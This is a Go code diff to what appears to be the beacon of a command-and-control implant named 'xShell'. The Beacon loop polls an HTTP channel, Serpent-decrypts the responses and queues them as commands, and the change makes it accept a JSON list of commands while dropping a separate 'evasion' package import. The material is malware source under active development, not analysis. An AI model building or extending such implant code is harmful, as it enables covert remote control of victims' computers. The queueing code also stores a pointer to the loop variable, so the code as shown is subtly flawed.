@@ -2,10 +2,10 @@ package internal
 
 import (
 	"bytes"
+	"encoding/json"
 	"io"
 	"math/rand"
 	"time"
-	"xShell/payload/evasion"
 )
 
 type Beacon struct {
@@ -38,12 +38,18 @@ func (b *Beacon) Run() {
 			if err != nil {
 				continue
 			}
-			decrypt, err := evasion.SerpentDecrypt(body, b.HttpLink.Key)
+			decrypt, err := SerpentDecrypt(body, b.HttpLink.Key)
 			if err != nil {
 				continue
 			} else {
-				command := string(decrypt)
-				b.Cqueue.Add(&command)
+				var cmds []string
+				err = json.Unmarshal(decrypt, &cmds)
+				if err != nil {
+					continue
+				}
+				for _, cmd := range cmds {
+					b.Cqueue.Add(&cmd)
+				}
 			}
 		} else {
 			newCmdReq, err := b.HttpLink.NewCmdRequest()
@@ -61,12 +67,18 @@ func (b *Beacon) Run() {
 			if err != nil || bytes.Equal(body, []byte{0x00}) {
 				continue
 			}
-			decrypt, err := evasion.SerpentDecrypt(body, b.HttpLink.Key)
+			decrypt, err := SerpentDecrypt(body, b.HttpLink.Key)
 			if err != nil {
 				continue
 			} else {
-				command := string(decrypt)
-				b.Cqueue.Add(&command)
+				var cmds []string
+				err = json.Unmarshal(decrypt, &cmds)
+				if err != nil {
+					continue
+				}
+				for _, cmd := range cmds {
+					b.Cqueue.Add(&cmd)
+				}
 			}
 		}
 	}
